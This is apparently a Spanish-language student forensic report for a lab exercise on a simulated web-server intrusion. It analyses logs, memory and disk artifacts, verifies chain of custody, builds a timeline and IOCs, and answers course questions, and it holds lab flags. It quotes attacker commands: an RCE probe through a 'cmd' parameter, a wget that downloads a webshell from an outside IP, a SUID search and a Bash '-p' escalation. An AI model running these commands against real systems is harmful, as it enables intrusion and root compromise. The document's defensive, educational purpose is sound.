# Informe forense — Incidente PhantomCorp (phantomcorp-web)

**Grupo:** 06
**Fecha:** 2026-10-23
**Sistema afectado:** phantomcorp-web (10.0.0.5) · **Tipo:** intrusión + exfiltración

| Nombre y apellido | Usuario de GitHub |
|---|---|
| Martín Beccereca | martinbeccereca |
| Belén Benito | belubenito603 |
| Alejo José De Miguel | AlejoDM |
| Tomás Giudici | TomasGiudici |
| Carolina Suppo | carosuppo |

## 0. Declaración de uso de IA

**Herramienta:** Claude Code.

- **Finalidad del uso:** apoyo para ejecutar el análisis de R1 (vector de entrada/RCE en `access.log`) y para redactar la estructura inicial del informe.
- **Partes asistidas:** estructura del informe, nota de custodia de R1 en la sección 2, y la respuesta a P1.
- **Verificación:** la búsqueda en `logs/access.log` se hizo con `grep` sin modificar el archivo original; la decodificación URL del parámetro `cmd` se hizo sobre el string extraído, no sobre el log. La discrepancia de `shasum -a 256 -c` en el checkout local se confirmó como un artefacto de conversión de finales de línea de Windows al comparar contra el contenido comiteado en git. Se revisó el contenido antes de incorporarlo.

**Herramienta:** Codex (OpenAI).

- **Finalidad del uso:** apoyo para examinar en modo solo lectura el artefacto defanged del webshell de R2 y el historial extraído de memoria para P4, y para redactar el aporte documental.
- **Partes asistidas:** correlación log–disco de R2, IOC del webshell, eventos de timeline vinculados, respuesta P4, bitácora y salidas de evidencia.
- **Verificación:** los valores, rutas, horas y líneas incorporados se contrastaron con las salidas crudas guardadas. No se ejecutó, reconstruyó ni modificó el contenido del webshell; el equipo debe revisar este texto y conservar la declaración solo si representa el uso real de IA.


**Herramienta:** Codex (OpenAI), aporte de la persona P3.

- **Finalidad y partes asistidas:** análisis de R3, correlación de historial/procesos/archivos abiertos/disco, IOC del binario SUID, eventos de timeline, respuesta P5, revisión del aporte P1 y bitácora.
- **Verificación:** referencias contrastadas con los artefactos, hashes del checkout y objetos locales de Git; se guardaron salidas y el rechazo del verificador.

**Herramienta:** ChatGPT (OpenAI), aporte de la Persona 5.

- **Finalidad del uso:** asistencia para verificar la integridad de los archivos del caso mediante SHA-256, identificar la evidencia alterada y documentar los resultados del Reto 5.
- **Partes asistidas:** análisis de la cadena de custodia, respuesta P2, registro de comandos y revisión de la tabla de indicadores de compromiso (IOCs).
- **Verificación:** se calcularon los hashes mediante Python y se compararon con `evidencia.sha256`. Se comprobó que ocho archivos coincidían al considerar los finales de línea LF, mientras que `logs/auth.log` seguía presentando una discrepancia. El archivo se examinó únicamente en modo lectura y la flag `FLAG{dfir_custodia_alterada}` fue aceptada por el validador oficial. No se modificaron los artefactos originales.

## 1. Resumen del incidente

*Pendiente de completar cuando estén los 5 hallazgos (R1–R5).*

## 2. Cadena de custodia

### R5 — Cadena de custodia y evidencia alterada

Se realizó una verificación de integridad SHA-256 de los nueve archivos del caso forense, comparando los hashes calculados con los registrados en `evidencia.sha256`.

En una primera comparación, los nueve archivos presentaron diferencias. Posteriormente se comprobó que, en ocho de ellos, la discrepancia se debía a los finales de línea de Windows (`CRLF`), ya que sus hashes coincidían al realizar una conversión a `LF` únicamente en memoria, sin modificar los originales.

Sin embargo, el archivo `logs/auth.log` continuó presentando una discrepancia que no pudo explicarse por esa transformación.

**Hash esperado:** `0000decafbad0000f1e2d3c4b5a6978800112233445566778899aabbccddeeff`

**Hash obtenido:** `9c052de3124d0364ae0172b81621c94d47bf78a2e816ba8c69be4d84468f1a6f`

Al revisar el contenido del archivo, encontramos anotaciones que indican que se eliminaron líneas y que el archivo fue editado después de su captura (`logs/auth.log:5-7`). En la línea 8 aparece el marcador `FLAG{dfir_custodia_alterada}`, que fue aceptado por el validador oficial.

La discrepancia demuestra que los bytes actuales de `auth.log` no coinciden con el hash registrado. Aunque los comentarios del archivo describen una alteración, **la verificación criptográfica por sí sola no permite determinar quién lo modificó, cuándo ni con qué intención**.

El análisis se realizó mediante operaciones de lectura. No se editaron los archivos del caso ni se reemplazaron los hashes originales. La salida de la verificación quedó conservada en `evidencia/salidas/r5-custodia.txt` y se guardó una copia del registro en `evidencia/salidas/r5-auth-log.txt`.

La integridad de `auth.log` no puede confirmarse con el manifiesto proporcionado. Por lo tanto, sus registros deben interpretarse con esa limitación y, en una investigación real, sería necesario contrastarlos con fuentes independientes.

Antes de analizar `logs/access.log` se corrió `shasum -a 256 -c evidencia.sha256` desde `caso/`. En el checkout local (Windows) el comando devolvió `FAILED`/`No such file or directory` para los 9 archivos del manifiesto. Esto es un falso positivo del entorno: Git tiene `core.autocrlf=true` y convierte los finales de línea de LF a CRLF al clonar en Windows, lo que deja un `\r` colgando en cada nombre de archivo listado por `evidencia.sha256` y rompe la búsqueda por nombre; no es evidencia de alteración por sí solo. Ver [salida completa del comando](evidencia/salidas/r1-custodia-check.txt).

Como control, se calculó el hash de `logs/access.log` contra el contenido tal como está comiteado en git (`git show HEAD:... | sha256sum`), que no pasa por esa conversión. Ese hash coincide con el registrado en `evidencia.sha256`: el archivo usado para R1 está íntegro. La verificación de los 9 archivos y la identificación del que sí está alterado quedan para la sección de R5.


Control complementario de P3: [hashes de los bytes locales](evidencia/salidas/p3-custodia-previa.txt). Todos difieren del manifiesto; no se considera íntegro el checkout byte a byte. Para las cinco fuentes utilizadas por P3, los objetos locales de `HEAD` sí coinciden con el manifiesto y el checkout solo difiere en CRLF/LF ([comparación](evidencia/salidas/p3-custodia-fuentes.txt)). Esa transformación se comparó en memoria, sin escribir en el caso. Esto delimita el efecto de Windows sobre estas fuentes; no autentica el origen del manifiesto ni sustituye el análisis de R5, que queda a su responsable.
## 3. Línea de tiempo del ataque

| Hora (UTC) | Evento | Evidencia (archivo:línea) |
|---|---|---|
| 05/Sep/2026 02:18:10 | `185.220.101.42` consulta `GET /api/reporte?...&cmd=id`: primera prueba de ejecución de comandos contra el endpoint. Confirmado por la respuesta `200`. | `logs/access.log:18` |
| 05/Sep/2026 02:18:33 | Misma IP envía `cmd=echo%20FLAG%7Bdfir_vector_sqli%7D%20%3E%20/tmp/.p` (URL-encoded). Decodificado: `echo FLAG{dfir_vector_sqli} > /tmp/.p`. Confirma que el parámetro `cmd` se ejecuta como comando del sistema — este es el vector de entrada/RCE (R1). | `logs/access.log:19` |
| 05/Sep/2026 02:19:02 | La misma IP usa el canal RCE para ejecutar `wget http://45.13.37.7/s.php -O /var/www/uploads/shell.php`. El listado de disco ubica ese archivo a las 02:19 y la evidencia defanged lo identifica como webshell; la coincidencia de ruta y minuto confirma la correlación log–disco. | `logs/access.log:20`; `disco/listado.txt:4`; `disco/var/www/uploads/shell.php.evidencia.txt:1-9` |
| 05/Sep/2026 02:19:48 | La misma IP solicita `/uploads/shell.php?c=whoami` y recibe `200`. Esto es consistente con el uso posterior del webshell descargado; el log no muestra el cuerpo de respuesta ni permite atribuir una identidad real al atacante. | `logs/access.log:21`; `disco/var/www/uploads/shell.php.evidencia.txt:5-10` |
| 05/Sep/2026 02:21 (hora del listado; zona no declarada en esa fuente) | El listado registra creación/modificación de `/usr/local/bin/system-check`, descrito como copia de Bash SUID root. El historial muestra búsqueda de SUID y ejecución del mismo binario con `-p -c 'id'`, sin hora propia. Es consistente con la escalada; 02:21 no prueba la hora exacta de ejecución. | `disco/listado.txt:1-5`; `memoria/bash_history.txt:5-7` |
| 05/Sep/2026 02:30 UTC (captura, no inicio del proceso) | El PID 1477 `system-check`, usuario `root`, `euid=0`, tiene como padre al PID 1240 `bash` de `www-data`. `lsof` vincula el PID 1477 con `/usr/local/bin/system-check`. Las fuentes respaldan un proceso con privilegios elevados en la captura. | `memoria/pslist.txt:1,7-8`; `memoria/lsof.txt:4` |
**R2 — webshell:** la evidencia de disco contiene `FLAG{dfir_webshell_hallado}`; el extracto completo y la correlación con el log están en [r2-webshell-disco.txt](evidencia/salidas/r2-webshell-disco.txt). La flag fue registrada con el verificador oficial tras normalizar a LF la copia temporal de los scripts y manifiestos utilizados por el verificador ([envío aceptado](evidencia/salidas/r2-submit.txt)).


**R3 — escalada SUID:** [fuentes con líneas](evidencia/salidas/r3-escalada-memoria.txt) y [salida directa de `rg`](evidencia/salidas/r3-fuentes-rg.txt). El historial contiene `/usr/local/bin/system-check -p -c 'id'` en la línea 6 y el marcador `FLAG{dfir_privesc_suid}` en la 7. Siendo una copia SUID root de Bash según el listado, `-p` conserva el privilegio efectivo al arrancar y `-c` ejecuta la orden indicada. El historial no incluye la salida de `id`; el respaldo de privilegios procede de `pslist`, que declara `euid=0`. No se ejecutó el binario ni se asumió que la escalada fuera persistencia por sí misma.

El primer [intento de registrar R3](evidencia/salidas/r3-submit.txt) fue rechazado por el verificador local. Posteriormente, se ejecutó desde Git Bash el comando `./ctf submit 11 R3 'FLAG{dfir_privesc_suid}'`, que devolvió `[ OK ] Reto R3 resuelto: Escalada de privilegios (SUID) en memoria`. El [estado actualizado](evidencia/salidas/r3-status-confirmado.txt) conserva la confirmación del progreso. Por lo tanto, **R3 quedó resuelto y validado oficialmente**. Se mantienen los registros del intento fallido anterior como parte del historial de trabajo.
## 4. Indicadores de compromiso (IOCs)

| Tipo | Valor | Dónde apareció |
|---|---|---|
| IP atacante | `185.220.101.42` | `logs/access.log:18-20`: origen de las solicitudes al endpoint `/api/reporte?cmd=`. No se verificó la identidad real del atacante. |
| IP/puerto C2 | `45.13.37.7:4444` | `memoria/netstat.txt:4`: conexión TCP `ESTABLISHED` asociada al proceso `nc` (PID 1490). |
| Archivo malicioso | `/var/www/uploads/shell.php` | `disco/listado.txt:4`, `disco/var/www/uploads/shell.php.evidencia.txt:1-9` y `logs/access.log:20-21`: webshell y actividad relacionada. |
| Usuario backdoor | `phantom-svc` (UID 0, GID 0) | `disco/etc/passwd.snippet:4`: cuenta identificada como backdoor con privilegios de root. |
| Persistencia | Cuenta `phantom-svc` y binario SUID `/usr/local/bin/system-check` | `disco/etc/passwd.snippet:4`, `disco/listado.txt:5` y `memoria/bash_history.txt:6`. Posibles mecanismos de acceso privilegiado. |
| Binario SUID sospechoso | `/usr/local/bin/system-check` | `disco/listado.txt:5`, `memoria/bash_history.txt:5-6` y `memoria/lsof.txt:4`. No se dispone del binario para calcular su hash. |
| Proceso elevado (contexto de captura) | PID 1477, PPID 1240, `system-check`, `root`, `euid=0` | `memoria/pslist.txt:7-8`: proceso elevado cuyo padre es una shell de `www-data`. |

## 5. Alcance del daño

*Pendiente de completar.*

## 6. Contención y erradicación (recomendaciones)

*Pendiente de completar.*

## 7. Preguntas de análisis (P1–P5)

**P1 — ¿Por qué la RAM se captura antes que el disco?**

El orden de volatilidad dice que se captura primero lo que se pierde más rápido. La RAM solo existe mientras la máquina está encendida: procesos en ejecución, conexiones de red activas y, en este caso, el historial de comandos de la sesión del atacante, viven ahí. El disco persiste aunque se apague el equipo, así que puede esperar. Si se captura primero el disco, cualquier cosa que solo estuviera en memoria en ese momento se pierde para siempre apenas el proceso termina o la máquina se reinicia.

En este caso puntual no tengo, desde R1, un ejemplo donde la memoria conservara algo que el disco ya no tenía (eso corresponde al R4, sobre `bash_history` en memoria, fuera de mi análisis). Lo que sí puedo señalar desde R1 es la razón estructural: `access.log` registra que el atacante ejecutó comandos arbitrarios a través del parámetro `cmd` (líneas 18-20), lo cual implica que corrió procesos y, probablemente, abrió conexiones de red (la descarga del webshell con `wget`) que en el momento de la intrusión solo existían como estado de memoria — procesos y sockets activos — y no como artefactos de disco. Si el equipo de respuesta hubiera esperado a capturar disco antes que memoria, esa actividad en curso se habría perdido apenas terminaran esos procesos.

**P2 — ¿Qué implica que una evidencia digital haya sido alterada? ¿Cómo afecta a su valor probatorio?**

La cadena de custodia es fundamental en una investigación forense porque permite registrar cómo se obtuvo, conservó y manipuló una evidencia digital, garantizando su trazabilidad y ayudando a comprobar su integridad.

En el Laboratorio 11, al verificar los hashes SHA-256 de los archivos, encontramos que `logs/auth.log` no coincidía con el hash registrado originalmente. Primero detectamos diferencias en los nueve archivos, pero comprobamos que en ocho casos se debían a los saltos de línea de Windows (CRLF). En cambio, `auth.log` seguía presentando una diferencia incluso después de considerar esa transformación.

Esto significa que no podemos asegurar que el contenido actual de ese archivo sea idéntico al registrado en el manifiesto de custodia. Sin embargo, la diferencia de hashes no demuestra por sí sola quién realizó la modificación, cuándo ocurrió ni cuál fue su intención.

Esta situación afecta la confiabilidad de la evidencia y puede disminuir su valor probatorio, ya que parte de la información podría haber sido modificada o eliminada.

Ante un caso así, lo correcto sería conservar el archivo tal como está, documentar la discrepancia, registrar las personas que tuvieron acceso a la evidencia y contrastar su contenido con otras fuentes. Si fuera posible, también se debería realizar una nueva adquisición forense.

Como conclusión, entendimos que en informática forense no alcanza solamente con encontrar información importante. También es necesario demostrar de dónde salió y qué tan confiable es antes de utilizarla para sacar conclusiones.

**P4 — El atacante corrió `history -c`. ¿Por qué igual pudiste recuperar sus comandos?**

`history -c` limpia la lista de historial de la shell activa y, en este caso, el artefacto declara que el `.bash_history` de disco fue borrado; no borra retroactivamente una adquisición de memoria ya realizada. El archivo `memoria/bash_history.txt` fue recuperado de memoria y conserva las órdenes previas —incluida la descarga del webshell en la línea 4— y el propio `history -c` en la línea 10 ([evidencia P4](evidencia/salidas/p2-history-memoria.txt)). Por eso la recuperación depende de que la memoria se haya capturado antes de apagar el host o de que el proceso sobrescribiera esas estructuras.

La evidencia permite afirmar que esos comandos estaban presentes en el artefacto de memoria provisto. No permite fijar por sí sola el instante exacto en que se ejecutó cada comando, demostrar que no hubo otras sesiones ni asegurar que toda actividad del atacante quedó recuperada. Para ampliar la atribución o la secuencia temporal harían falta artefactos adicionales, como procesos, sockets, timestamps y logs correlacionados.

**P5 — ¿Por qué un buen forense tiene que entender cómo ataca un pentester?**

Conocer la secuencia ofensiva permite formular hipótesis concretas y buscar huellas verificables. En este caso, `find / -perm -4000 -type f` seguido de `system-check -p -c 'id'` orienta a una búsqueda y uso de un binario SUID, no a una simple consulta de identidad (`memoria/bash_history.txt:5-6`). El listado lo identifica como copia de Bash SUID root (`disco/listado.txt:5`); `pslist` muestra después un proceso con `euid=0` cuyo padre corre como `www-data` (`memoria/pslist.txt:7-8`), y `lsof` conecta su PID con la ruta del binario (`memoria/lsof.txt:4`). Entender privilegios efectivos y opciones de Bash permite explicar esa correlación.

Ese conocimiento no reemplaza la evidencia: el historial no aporta salida de `id` ni timestamps por comando, y la hora de captura no es la de inicio del proceso. Un forense debe separar lo observado de la hipótesis, buscar corroboración independiente y preservar los artefactos. A su vez, conocer qué rastros deja un pentest ayuda a pedir la telemetría adecuada y a recomendar revisar SUID innecesarios, integridad de binarios y procesos privilegiados. No autoriza ejecutar el artefacto sospechoso para comprobarlo sobre el sistema investigado.

## 8. Bitácora

### Persona P3 — R3 y revisión de P1 (2026-10-23)

1. Se verificaron los hashes SHA-256 con `Get-FileHash` contra `evidencia.sha256`, interpretando sus rutas sin el CR final. La salida completa está en [p3-custodia-previa.txt](evidencia/salidas/p3-custodia-previa.txt). No se modificaron los archivos originales.
2. Desde la raíz del repositorio se ejecutó el análisis reproducible:

   ```powershell
   python entregas/lab11/grupo06/src/p3_analisis.py
   rg -n '.' labs/lab11-forensia/caso/memoria/bash_history.txt labs/lab11-forensia/caso/memoria/pslist.txt labs/lab11-forensia/caso/memoria/lsof.txt labs/lab11-forensia/caso/disco/listado.txt > entregas/lab11/grupo06/evidencia/salidas/r3-fuentes-rg.txt
   ```

   El script calcula hashes, consulta únicamente objetos locales de Git mediante `git show HEAD:<ruta>` y produce un extracto con números de línea. No implementa la ampliación opcional `timeline.py`. El historial se lee como texto, nunca como órdenes a ejecutar.
3. Se preparó una copia temporal del verificador oficial y sus bibliotecas con finales LF; el manifest se usó como entrada opaca del motor. Desde esa raíz temporal, con Git Bash local, se ejecutó:

   ```bash
   bash ./ctf submit 11 R3 'FLAG{dfir_privesc_suid}'
   bash ./ctf status 11
   ```

   Se conservaron las evidencias del primer intento rechazado y del estado parcial. Posteriormente, se ejecutó desde Git Bash, en la raíz del repositorio, `./ctf submit 11 R3 'FLAG{dfir_privesc_suid}'`. El verificador oficial aceptó la flag y confirmó que R3 estaba resuelto. Se registró el progreso mediante `./ctf status 11`, cuya salida se guardó en `evidencia/salidas/r3-status-confirmado.txt`. No se alteraron los artefactos forenses ni el mecanismo de verificación.
   
4. Revisión del aporte de P1: las líneas 18-20 de `access.log` registran solicitudes y HTTP 200; ese código solo no confirma ejecución del parámetro ni el contenido de la respuesta. El marcador decodificado y la coincidencia de `wget` en `memoria/bash_history.txt:4` son corroboración adicional, pero el historial no fija una hora propia. Conviene reemplazar «confirmado por 200» por «solicitud observada, consistente con RCE al correlacionar fuentes». La respuesta P1 menciona procesos y sockets volátiles, pero deja pendiente el ejemplo solicitado de memoria frente a disco; `memoria/bash_history.txt:1,10` ofrece ese ejemplo. Esta revisión deja observaciones para P1 sin reescribir su respuesta ni asumir su tarea.
